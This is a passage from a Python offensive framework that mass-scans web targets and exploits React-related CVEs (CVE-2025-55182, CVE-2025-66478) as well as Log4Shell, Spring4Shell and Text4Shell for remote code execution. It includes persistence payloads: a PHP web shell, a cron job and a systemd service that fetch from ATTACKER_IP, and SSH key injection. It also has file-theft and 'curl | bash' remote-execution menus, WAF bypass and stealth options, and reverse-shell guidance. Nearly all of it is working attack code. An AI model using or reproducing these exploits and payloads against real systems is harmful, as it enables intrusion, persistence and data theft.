        {"name": "Web Shell Upload", "command": "echo '<?php system($_GET[\"cmd\"]); ?>' > /tmp/shell.php", "description": "Simple PHP web shell"},
        {"name": "Cron Job Persistence", "command": "echo '* * * * * curl http://ATTACKER_IP/cron.sh | bash' >> /tmp/cronjob && crontab /tmp/cronjob", "description": "Change ATTACKER_IP"},
        {"name": "SSH Key Injection", "command": "mkdir -p ~/.ssh && echo 'YOUR_PUBLIC_KEY' >> ~/.ssh/authorized_keys", "description": "Replace with your SSH public key"},
        {"name": "SystemD Service", "command": "echo '[Unit]\\nDescription=Persistence\\n\\n[Service]\\nType=simple\\nExecStart=/bin/bash -c \"while true; do curl http://ATTACKER_IP/checkin; sleep 300; done\"\\n\\n[Install]\\nWantedBy=multi-user.target' > /etc/systemd/system/persist.service && systemctl enable persist.service", "description": "Change ATTACKER_IP"}
    ]
    print("[+] Checking environment...")
    check_commands = [
        ("whoami", "Current user"),
        ("id", "User privileges"),
        ("uname -a", "System info"),
        ("pwd", "Current directory"),
        ("ls -la", "Directory listing"),
        ("cat /etc/passwd | head -5", "System users"),
        ("ps aux | head -10", "Running processes"),
        ("which python python3 java php curl wget nc netcat", "Available tools")
    ]
    for cmd, desc in check_commands:
        print(f"\n[+] {desc}: {cmd}")
        exploit_vulnerability(target_url, endpoint, method, payload_template, cmd)
        time.sleep(1)
    print("\n" + "=" * 70)
    print("PERSISTENCE METHODS")
    print("=" * 70)
    for i, meth in enumerate(persistence_methods, 1):
        print(f"{i}. {meth['name']}\n   {meth['description']}\n   Command: {meth['command'][:80]}...")
    print("\nSelect method number to execute, or 'custom' for custom command:")
    choice = input("> ").strip()
    if choice.lower() == 'custom':
        custom_cmd = input("Enter custom persistence command: ")
        exploit_vulnerability(target_url, endpoint, method, payload_template, custom_cmd)
    elif choice.isdigit():
        idx = int(choice) - 1
        if 0 <= idx < len(persistence_methods):
            selected = persistence_methods[idx]
            print(f"\n[+] Executing: {selected['name']}")
            cmd = selected['command']
            if "ATTACKER_IP" in cmd:
                attacker_ip = input("Enter your attacker IP: ").strip()
                cmd = cmd.replace("ATTACKER_IP", attacker_ip)
            if "YOUR_PUBLIC_KEY" in cmd:
                pub_key = input("Paste your SSH public key: ").strip()
                cmd = cmd.replace("YOUR_PUBLIC_KEY", pub_key)
            exploit_vulnerability(target_url, endpoint, method, payload_template, cmd)
            if "netcat" in cmd.lower() or "dev/tcp" in cmd.lower():
                print("\n[+] To catch reverse shell, run on your machine: nc -lvnp 4444")
        else:
            print("[!] Invalid selection")
    else:
        print("[!] Invalid input")

def file_operations_menu(target_url, endpoint, method='POST', payload_template=None):
    while True:
        print("\n" + "=" * 50)
        print("FILE OPERATIONS")
        print("=" * 50)
        print("1. Read file")
        print("2. Write file")
        print("3. Execute local script")
        print("4. Download file to server")
        print("5. Upload file from server")
        print("6. Back")
        choice = input("\nSelect > ").strip()
        if choice == '1':
            file_path = input("Enter file path to read: ").strip()
            cmd = f"cat {file_path}"
            exploit_vulnerability(target_url, endpoint, method, payload_template, cmd)
        elif choice == '2':
            file_path = input("Enter file path to write: ").strip()
            content = input("Enter content (use \\n for new lines): ").strip()
            content = content.replace('"', '\\"').replace('$', '\\$')
            cmd = f'echo "{content}" > {file_path}'
            exploit_vulnerability(target_url, endpoint, method, payload_template, cmd)
        elif choice == '3':
            script_url = input("Enter script URL to download and execute: ").strip()
            cmd = f"curl -s {script_url} | bash"
            exploit_vulnerability(target_url, endpoint, method, payload_template, cmd)
        elif choice == '4':
            remote_file = input("Enter remote file URL to download: ").strip()
            local_path = input("Enter local path to save: ").strip()
            cmd = f"curl -s {remote_file} -o {local_path}"
            exploit_vulnerability(target_url, endpoint, method, payload_template, cmd)
        elif choice == '5':
            print("\n[+] To upload file from server, first start HTTP server on your machine:")
            print("    python3 -m http.server 8080")
            print("\nThen run download command on target:")
            server_ip = input("Enter your server IP: ").strip()
            filename = input("Enter filename on your server: ").strip()
            save_path = input("Enter save path on target: ").strip()
            cmd = f"curl http://{server_ip}:8080/{filename} -o {save_path}"
            exploit_vulnerability(target_url, endpoint, method, payload_template, cmd)
        elif choice == '6':
            break

def interactive_exploitation_menu(vulnerabilities):
    if not vulnerabilities:
        print("[!] No vulnerabilities available for exploitation")
        return None
    print("\n" + "=" * 70)
    print("EXPLOITATION MENU")
    print("=" * 70)
    for i, vuln in enumerate(vulnerabilities, 1):
        status = vuln.get('vulnerable', 'Unknown')
        url = vuln.get('url', 'N/A')
        endpoint = vuln.get('endpoint', 'N/A')
        print(f"{i}. [{status}] {url}\n   Endpoint: {endpoint}")
    print("\nCommands: [number] - Select, back - Return, exit - Exit")
    while True:
        choice = input("\nSelect > ").strip().lower()
        if choice == 'back':
            return None
        elif choice == 'exit':
            print("[+] Exiting...")
            sys.exit(0)
        elif choice.isdigit():
            idx = int(choice) - 1
            if 0 <= idx < len(vulnerabilities):
                return vulnerabilities[idx]
            else:
                print("[!] Invalid selection")
        else:
            print("[!] Invalid input")

def exploitation_command_menu():
    print("\n" + "=" * 50)
    print("EXPLOITATION COMMANDS")
    print("=" * 50)
    commands = list(EXPLOIT_PAYLOADS.keys())
    for i, cmd in enumerate(commands, 1):
        if cmd == "custom":
            print(f"{i}. {cmd} - Enter custom command")
        else:
            print(f"{i}. {cmd}")
    print("\nOr enter custom command directly")
    while True:
        choice = input("\nSelect command (number or command) > ").strip().lower()
        if choice.isdigit():
            idx = int(choice) - 1
            if 0 <= idx < len(commands):
                return commands[idx]
            else:
                print("[!] Invalid selection")
        elif choice in commands:
            return choice
        elif choice in ['back', 'exit']:
            return choice
        else:
            EXPLOIT_PAYLOADS['custom_temp'] = f'{{"query": "{{{{T(java.lang.Runtime).getRuntime().exec(\\"{choice}\\")}}}}"}}'
            return choice

def load_report_and_exploit(report_file):
    try:
        with open(report_file, 'r') as f:
            report = json.load(f)
        results = report.get('results', [])
        vulnerabilities = [r for r in results if r.get('vulnerable')]
        if not vulnerabilities:
            print(f"[!] No vulnerabilities found in report: {report_file}")
            return
        print(f"\n[+] Loaded report: {report_file}")
        print(f"[+] Found {len(vulnerabilities)} vulnerabilities")
        while True:
            vuln = interactive_exploitation_menu(vulnerabilities)
            if not vuln:
                break
            cmd_choice = exploitation_command_menu()
            if cmd_choice in ['back', 'exit']:
                if cmd_choice == 'exit':
                    sys.exit(0)
                continue
            exploit_vulnerability(
                target_url=vuln.get('url'),
                endpoint=vuln.get('endpoint'),
                method=vuln.get('method', 'POST'),
                payload_template=vuln.get('payload_used'),
                command=cmd_choice
            )
            cont = input("\nContinue exploitation? (yes/no): ").strip().lower()
            if cont not in ['yes', 'y']:
                break
    except Exception as e:
        print(f"[!] Error loading report: {str(e)}")

def mass_cve_scan(input_file, output_file="cve_results.txt", threads=None):
    try:
        with open(input_file, 'r') as f:
            targets = [line.strip() for line in f if line.strip()]
        if not targets:
            print("[!] No targets provided for CVE scan")
            return
        default_workers = max(2, min(os.cpu_count() or 4, 16))
        max_workers = threads if threads else default_workers
        max_workers = min(max_workers, len(targets))
        print(f"\n[+] Starting mass CVE scan on {len(targets)} targets using {max_workers} threads")
        scan_results = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
            future_to_target = {executor.submit(cve_specific_scan, target): target for target in targets}
            for completed, future in enumerate(concurrent.futures.as_completed(future_to_target), start=1):
                target = future_to_target[future]
                try:
                    result = future.result()
                except Exception as e:
                    print(f"[!] Error scanning {target}: {e}")
                    result = None
                scan_results.append((target, result))
                print(f"[{completed}/{len(targets)}] Finished scanning {target}")
        with open(output_file, 'w') as out_f:
            out_f.write("CVE Scan Results\n")
            out_f.write(f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            out_f.write("="*50 + "\n")
            for target, results in scan_results:
                if results:
                    out_f.write(f"\nTarget: {target}\n")
                    for result in results:
                        out_f.write(f"  - {result['cve']}: {result['endpoint']}\n    Evidence: {result['evidence']}\n")
                else:
                    out_f.write(f"\nTarget: {target} - No CVE vulnerabilities found\n")
        print(f"\n[+] Results saved to {output_file}")
    except Exception as e:
        print(f"[!] Error: {e}")

def main_scan_mode(input_file, output_prefix, threads=None):
    global interrupted
    try:
        with open(input_file, 'r') as f:
            raw_urls = [line.strip() for line in f if line.strip()]
            urls = []
            for raw in raw_urls:
                urls.extend(protocol_hopper(raw))
    except:
        print(f"[!] Could not read file: {input_file}")
        sys.exit(1)
    print(f"[*] Ultimate React4Shell Scanner Started")
    print(f"[*] React2Shell multipart probes: Enabled")
    default_workers = max(2, min(os.cpu_count() or 4, 16))
    max_workers = threads if threads else default_workers
    max_workers = min(max_workers, len(urls)) if urls else 1
    print(f"[*] Targets: {len(urls)}")
    print(f"[*] CVE-2025-55182, CVE-2025-66478, Log4Shell, Spring4Shell, Text4Shell: Enabled")
    print(f"[*] WAF Bypass Techniques: Enabled")
    print(f"[*] Rotating Headers: {len(USER_AGENTS)} user agents")
    print(f"[*] Endpoints to test: {len(ENDPOINTS)}")
    print(f"[*] Stealth Mode: Random delays enabled")
    print(f"[*] Thread workers: {max_workers}")
    print(f"[*] Press Ctrl+C to stop and save partial results")
    print("-" * 50)
    results = []
    scanned = 0
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {}
        for url in urls:
            if interrupted:
                break
            future = executor.submit(check_react4shell, url)
            futures[future] = url
        for future in concurrent.futures.as_completed(futures):
            if interrupted:
                break
            url = futures[future]
            scanned += 1
            try:
                result = future.result(timeout=15)
                results.extend(result)
                vuln_status = "safe"
                for r in result:
                    if r.get('vulnerable') == 'Confirmed':
                        vuln_status = "CONFIRMED"
                        break
                    elif r.get('vulnerable') == 'Potential':
                        vuln_status = "POTENTIAL"
                print(f"[{scanned}/{len(urls)}] {vuln_status} - {url[:50]}...")
            except concurrent.futures.TimeoutError:
                results.append({'url': url, 'vulnerable': False, 'evidence': 'Timeout (WAF may be blocking)', 'timestamp': datetime.now().isoformat()})
                print(f"[{scanned}/{len(urls)}] TIMEOUT - {url[:50]}...")
            except Exception as e:
                results.append({'url': url, 'vulnerable': False, 'evidence': f'Error: {str(e)[:50]}', 'timestamp': datetime.now().isoformat()})
                print(f"[{scanned}/{len(urls)}] ERROR   - {url[:50]}...")
    print("\n" + "=" * 50)
    if interrupted:
        print(f"[!] Scan interrupted after {scanned} targets")
    else:
        print(f"[*] Scan completed: {scanned} targets")
    print(f"[*] Generating enhanced reports...")
    report = generate_report(results, output_prefix)
    print(f"[+] Report saved to: {output_prefix}.txt")
    print(f"[+] JSON data saved to: {output_prefix}.json")
    if report:
        vulnerabilities = [r for r in results if r.get('vulnerable')]
        if vulnerabilities:
            print(f"\n[!] Found {len(vulnerabilities)} vulnerabilities!")
            exploit_now = input("\nDo you want to exploit one of the vulnerabilities now? (yes/no): ").strip().lower()
            if exploit_now in ['yes', 'y']:
                load_report_and_exploit(f"{output_prefix}.json")
        else:
            print(f"\n[*] No vulnerabilities found in scanned targets")
    return report

def main_menu():
    print("\n" + "=" * 70)
    print("ULTIMATE REACT4SHELL / REACT2SHELL FRAMEWORK")
    print("CVE-2025-55182, CVE-2025-66478, Log4Shell, Spring4Shell, Text4Shell")
    print("=" * 70)
    print("\nOptions:")
    print("  1. Scan new targets")
    print("  2. Load and exploit from existing report")
    print("  3. Direct exploitation (manual target)")
    print("  4. Verify RCE (check if exploit is real)")
    print("  5. Aggressive exploitation (WAF bypass)")
    print("  6. CVE-specific scan (all CVEs)")
    print("  7. Hybrid exploitation (all techniques)")
    print("  8. Advanced persistence")
    print("  9. File operations")
    print("  10. Mass CVE scanning")
    print("  11. Scan single target (detailed)")
    print("  12. Post-exploitation (for confirmed RCE)")
    print("  13. Exit")
    while True:
        choice = input("\nSelect option > ").strip()
        if choice == '1':
            input_file = input("Enter path to targets file: ").strip()
            output_prefix = input("Enter output prefix: ").strip()
            threads_input = input("Threads to use (press enter for auto): ").strip()
            threads = int(threads_input) if threads_input.isdigit() and int(threads_input) > 0 else None
            if input_file and output_prefix:
                main_scan_mode(input_file, output_prefix, threads=threads)
            else:
                print("[!] Invalid input")
        elif choice == '2':
            report_file = input("Enter path to report JSON file: ").strip()
            if report_file:
                load_report_and_exploit(report_file)
            else:
                print("[!] Invalid input")
        elif choice == '3':
            target_url = input("Enter target URL: ").strip()
            endpoint = input("Enter endpoint (press enter for auto-detection): ").strip()
            command = input("Enter command to execute (default: id): ").strip() or "id"
            if target_url:
                if not endpoint:
                    print("[+] Auto-detecting working endpoints...")
                    working_endpoints = find_working_endpoint(target_url)
                    if working_endpoints:
                        print(f"[+] Found {len(working_endpoints)} working endpoints:")
                        for i, ep in enumerate(working_endpoints, 1):
                            print(f"  {i}. {ep['url']} ({ep['method']})")
                        print("\nOptions: [number] - Test specific, all - Test ALL, quick - Try common")
                        endpoint_choice = input("\nSelect> ").strip().lower()
                        if endpoint_choice == 'all':
                            exploit_all_endpoints(target_url, command)
                        elif endpoint_choice == 'quick':
                            common = ["/api/graphql", "/graphql", "/api/rest", "/api/v1/graphql", "/graphql-api", "/api"]
                            for ep_path in common:
                                ep_url = urllib.parse.urljoin(target_url.rstrip('/') + '/', ep_path.lstrip('/'))
                                print(f"\n[+] Testing: {ep_url}")
                                exploit_vulnerability(target_url, ep_url, command=command)
                                cont = input("\nContinue? (yes/no): ").strip().lower()
                                if cont not in ['yes', 'y']:
                                    break
                        elif endpoint_choice.isdigit():
                            idx = int(endpoint_choice) - 1
                            if 0 <= idx < len(working_endpoints):
                                ep = working_endpoints[idx]
                                exploit_vulnerability(target_url, ep['url'], method=ep.get('method', 'POST'), command=command)
                            else:
                                print("[!] Invalid selection")
                        else:
                            print("[!] Invalid input")
                    else:
                        print("[-] No working endpoints found. Testing all endpoints...")
                        exploit_all_endpoints(target_url, command)
                else:
                    exploit_vulnerability(target_url, endpoint, command=command)
            else:
                print("[!] Target URL required")
        elif choice == '4':
            target_url = input("Enter target URL: ").strip()
            endpoint = input("Enter endpoint (press enter for auto-detection): ").strip()
            if target_url:
                if not endpoint:
                    endpoint = target_url.rstrip('/') + '/api/graphql'
                print(f"\n[!] WARNING: Previous success may be false positive!")
                check_real_rce(target_url, endpoint)
                blind_rce_test(target_url, endpoint)
            else:
                print("[!] Target URL required")
        elif choice == '5':
            target_url = input("Enter target URL: ").strip()
            endpoint = input("Enter endpoint (or press enter to scan first): ").strip()
            command = input("Enter command to execute (default: id): ").strip() or "id"
            if target_url:
                if not endpoint:
                    print("[+] Scanning for endpoints first...")
                    results = check_react4shell(target_url)
                    vulns = [r for r in results if r.get('vulnerable')]
                    if vulns:
                        print(f"[+] Found {len(vulns)} potential endpoints")
                        for i, vuln in enumerate(vulns, 1):
                            print(f"  {i}. {vuln.get('endpoint')}")
                        endpoint_choice = input("\nSelect endpoint number (or enter custom): ").strip()
                        if endpoint_choice.isdigit():
                            idx = int(endpoint_choice) - 1
                            if 0 <= idx < len(vulns):
                                endpoint = vulns[idx].get('endpoint')
                        else:
                            endpoint = endpoint_choice
                    else:
                        print("[-] No vulnerabilities found. Testing all endpoints in aggressive mode...")
                        exploit_all_endpoints(target_url, command, aggressive=True)
                        return
                if endpoint:
                    exploit_vulnerability(target_url, endpoint, command=command, aggressive=True)
            else:
                print("[!] Target URL required")
        elif choice == '6':
            target_url = input("Enter target URL: ").strip()
            if target_url:
                results = cve_specific_scan(target_url)
                if results:
                    print(f"\n[+] Found {len(results)} potential CVE vulnerabilities:")
                    for result in results:
                        print(f"  - {result['cve']} at {result['endpoint']}")
                    exploit = input("\nExploit found vulnerabilities? (yes/no): ").strip().lower()
                    if exploit in ['yes', 'y']:
                        for result in results:
                            cmd = input(f"Enter command for {result['cve']} (default: whoami): ").strip() or "whoami"
                            hybrid_exploit(result['url'], result['endpoint'], cmd)
                else:
                    print("[-] No CVE vulnerabilities found")
        elif choice == '7':
            target_url = input("Enter target URL: ").strip()
            endpoint = input("Enter endpoint (press enter for auto-detection): ").strip()
            command = input("Enter command to execute (default: id): ").strip() or "id"
            if target_url:
                if not endpoint:
                    endpoints_to_try = ["/api/graphql", "/graphql", "/actuator/health", "/actuator/env", "/v2/api-docs"]
                    for ep in endpoints_to_try:
                        url = urllib.parse.urljoin(target_url.rstrip('/') + '/', ep.lstrip('/'))
                        print(f"\n[+] Trying {url}")
                        if hybrid_exploit(target_url, url, "echo 'test'"):
                            endpoint = url
                            break
                if endpoint:
                    hybrid_exploit(target_url, endpoint, command)
        elif choice == '8':
            target_url = input("Enter target URL: ").strip()
            endpoint = input("Enter endpoint: ").strip()
            if target_url and endpoint:
                advanced_persistence(target_url, endpoint)
            else:
                print("[!] Target URL and endpoint required")
        elif choice == '9':
            target_url = input("Enter target URL: ").strip()
            endpoint = input("Enter endpoint: ").strip()
            if target_url and endpoint:
                file_operations_menu(target_url, endpoint)
            else:
                print("[!] Target URL and endpoint required")
        elif choice == '10':
            input_file = input("Enter path to targets file: ").strip()
            output_file = input("Enter output file (default: cve_results.txt): ").strip() or "cve_results.txt"
            threads_input = input("Threads to use (press enter for auto): ").strip()
            threads = int(threads_input) if threads_input.isdigit() and int(threads_input) > 0 else None
            if input_file:
                mass_cve_scan(input_file, output_file, threads=threads)
        elif choice == '11':
            target_url = input("Enter target URL to scan: ").strip()
            if target_url:
                print(f"[+] Starting detailed scan of {target_url}")
                results = check_react4shell(target_url)
                print(f"\n[+] Scan completed")
                vulns = [r for r in results if r.get('vulnerable')]
                if vulns:
                    print(f"[+] Found {len(vulns)} potential vulnerabilities:")
                    for vuln in vulns:
                        print(f"  - {vuln.get('endpoint')} ({vuln.get('vulnerable')})")
                    verify = input("\nVerify if these are real RCE? (yes/no): ").strip().lower()
                    if verify in ['yes', 'y']:
                        for vuln in vulns:
                            print(f"\n[+] Verifying: {vuln.get('endpoint')}")
                            check_real_rce(vuln.get('url'), vuln.get('endpoint'), vuln.get('method', 'POST'))
                else:
                    print("[-] No vulnerabilities found")
        elif choice == '12':
            target_url = input("Enter target URL: ").strip()
            endpoint = input("Enter endpoint: ").strip()
            if target_url and endpoint:
                print("\n[+] Testing RCE...")
                exploit_vulnerability(target_url, endpoint, command="whoami")
                confirm = input("\nDoes RCE work? (yes/no): ").strip().lower()
                if confirm in ['yes', 'y']:
                    establish_persistence(target_url, endpoint)
            else:
                print("[!] Target URL and endpoint required")
        elif choice == '13':
            print("[+] Exiting...")
            sys.exit(0)
        else:
            print("[!] Invalid option")

def main():
    parser = argparse.ArgumentParser(
        description='Ultimate React4Shell Scanner with multiple CVE exploitation',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""Examples:
  %(prog)s scan targets.txt results                     # Scan targets
  %(prog)s exploit report.json                          # Exploit from report
  %(prog)s menu                                         # Interactive menu
  %(prog)s direct http://target.com                     # Direct exploitation
  %(prog)s direct http://target.com -e /graphql -a -c id  # Aggressive mode
  %(prog)s cve-scan targets.txt -o out.txt              # Mass CVE scan
  %(prog)s safe-audit http://target.com                 # Passive audit
  %(prog)s log-audit http://target.com                  # Log4Shell audit
  %(prog)s --insecure direct http://target.com          # Disable TLS verify
        """
    )
    parser.add_argument('--insecure', action='store_true', help='Disable TLS verification')
    parser.add_argument('--verbose-errors', action='store_true', help='Log swallowed network errors')
    subparsers = parser.add_subparsers(dest='mode', help='Operation mode')
    scan_parser = subparsers.add_parser('scan', help='Scan targets')
    scan_parser.add_argument('input_file')
    scan_parser.add_argument('output_prefix')
    scan_parser.add_argument('-t', '--threads', type=int, help='Number of threads')
    report_parser = subparsers.add_parser('exploit', help='Exploit from report')
    report_parser.add_argument('report_file')
    direct_parser = subparsers.add_parser('direct', help='Direct exploitation')
    direct_parser.add_argument('target_url')
    direct_parser.add_argument('-e', '--endpoint', help='Specific endpoint')
    direct_parser.add_argument('-c', '--command', default='id', help='Command to execute')
    direct_parser.add_argument('-a', '--aggressive', action='store_true', help='Use aggressive WAF bypass')
    direct_parser.add_argument('--test-all', action='store_true', help='Test ALL endpoints')
    direct_parser.add_argument('--quick', action='store_true', help='Test only common endpoints')
    direct_parser.add_argument('--cve-scan', action='store_true', help='CVE-specific scan only')
    direct_parser.add_argument('--hybrid', action='store_true', help='Use hybrid exploitation')
    direct_parser.add_argument('--no-strict-verify', action='store_true', help='Disable strict verification')
    cve_parser = subparsers.add_parser('cve-scan', help='Mass CVE scanning')
    cve_parser.add_argument('input_file')
    cve_parser.add_argument('-o', '--output', default='cve_results.txt')
    cve_parser.add_argument('-t', '--threads', type=int)
    safe_parser = subparsers.add_parser('safe-audit', help='Safe encoding audit')
    safe_parser.add_argument('target_url')
    safe_parser.add_argument('-o', '--output', help='JSON output file')
    log_parser = subparsers.add_parser('log-audit', help='Log4Shell risk audit')
    log_parser.add_argument('target_url')
    log_parser.add_argument('-o', '--output', help='JSON output file')
    subparsers.add_parser('menu', help='Start interactive menu')
    args = parser.parse_args()
    if not args.mode:
        parser.print_help()
        sys.exit(1)
    random.seed(time.time())
    configure_runtime_security(insecure=args.insecure, verbose_errors=args.verbose_errors)
    import socket
    socket.setdefaulttimeout(15)
    if args.insecure:
        os.environ['PYTHONWARNINGS'] = 'ignore'
    try:
        if args.mode == 'scan':
            main_scan_mode(args.input_file, args.output_prefix, threads=args.threads)
        elif args.mode == 'exploit':
            load_report_and_exploit(args.report_file)
        elif args.mode == 'direct':
            if args.cve_scan:
                results = cve_specific_scan(args.target_url)
                if results:
                    print(f"\n[+] Found {len(results)} CVE vulnerabilities")
                    for r in results:
                        print(f"  - {r['cve']}: {r['endpoint']}")
            elif args.hybrid:
                endpoint = args.endpoint if args.endpoint else args.target_url.rstrip('/') + '/api/graphql'
                hybrid_exploit(args.target_url, endpoint, args.command)
            else:
                if args.endpoint:
                    if args.endpoint.startswith('http'):
                        endpoint_url = args.endpoint
                    else:
                        endpoint_url = urllib.parse.urljoin(args.target_url.rstrip('/') + '/', args.endpoint.lstrip('/'))
                    print(f"[+] Using specified endpoint: {endpoint_url}")
                    exploit_vulnerability(args.target_url, endpoint_url, command=args.command, aggressive=args.aggressive, strict_verify=(not args.no_strict_verify))
                else:
                    if args.quick:
                        common = ["/api/graphql", "/graphql", "/api/rest", "/api/v1/graphql", "/graphql-api", "/api"]
                        for ep in common:
                            url = urllib.parse.urljoin(args.target_url.rstrip('/') + '/', ep.lstrip('/'))
                            print(f"\n[+] Testing: {url}")
                            exploit_vulnerability(args.target_url, url, command=args.command, aggressive=args.aggressive, strict_verify=(not args.no_strict_verify))
                            time.sleep(0.5)
                    elif args.test_all:
                        exploit_all_endpoints(args.target_url, args.command, args.aggressive, strict_verify=(not args.no_strict_verify))
                    else:
                        print(f"[+] Auto-detecting working endpoints for {args.target_url}")
                        working = find_working_endpoint(args.target_url)
                        if working:
                            print(f"[+] Found {len(working)} working endpoints")
                            for ep in working:
                                print(f"\n[+] Testing: {ep['url']}")
                                exploit_vulnerability(args.target_url, ep['url'], method=ep.get('method', 'POST'), command=args.command, aggressive=args.aggressive, strict_verify=(not args.no_strict_verify))
                                time.sleep(0.5)
                        else:
                            print("[-] No working endpoints found automatically")
                            print("[!] You can: 1. Test ALL endpoints, 2. Try common endpoints, 3. Enter custom endpoint")
                            c = input("\nSelect option (1/2/3): ").strip()
                            if c == '1':
                                exploit_all_endpoints(args.target_url, args.command, args.aggressive, strict_verify=(not args.no_strict_verify))
                            elif c == '2':
                                common = ["/api/graphql", "/graphql", "/api/rest", "/api/v1/graphql", "/graphql-api", "/api"]
                                for ep in common:
                                    url = urllib.parse.urljoin(args.target_url.rstrip('/') + '/', ep.lstrip('/'))
                                    print(f"\n[+] Testing: {url}")
                                    exploit_vulnerability(args.target_url, url, command=args.command, aggressive=args.aggressive, strict_verify=(not args.no_strict_verify))
                                    time.sleep(0.5)
                            elif c == '3':
                                custom = input("Enter custom endpoint path: ").strip()
                                if custom:
                                    if custom.startswith('http'):
                                        url = custom
                                    else:
                                        url = urllib.parse.urljoin(args.target_url.rstrip('/') + '/', custom.lstrip('/'))
                                    exploit_vulnerability(args.target_url, url, command=args.command, aggressive=args.aggressive, strict_verify=(not args.no_strict_verify))
                            else:
                                print("[!] Invalid choice")
        elif args.mode == 'cve-scan':
            mass_cve_scan(args.input_file, args.output, threads=args.threads)
        elif args.mode == 'safe-audit':
            safe_results = safe_full_audit(args.target_url)
            if args.output:
                with open(args.output, 'w') as f:
                    json.dump({'scan_date': datetime.now().isoformat(), 'target': args.target_url, 'mode': 'safe-audit', 'results': safe_results}, f, indent=2)
                print(f"[+] Safe audit report saved: {args.output}")
        elif args.mode == 'log-audit':
            log_results = safe_log_audit(args.target_url)
            if args.output:
                with open(args.output, 'w') as f:
                    json.dump({'scan_date': datetime.now().isoformat(), 'target': args.target_url, 'mode': 'log-audit', 'results': log_results}, f, indent=2)
                print(f"[+] Log audit report saved: {args.output}")
        elif args.mode == 'menu':
            main_menu()
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
    except Exception as e:
        print(f"\n[!] Critical error: {e}")

if __name__ == "__main__":
    main()
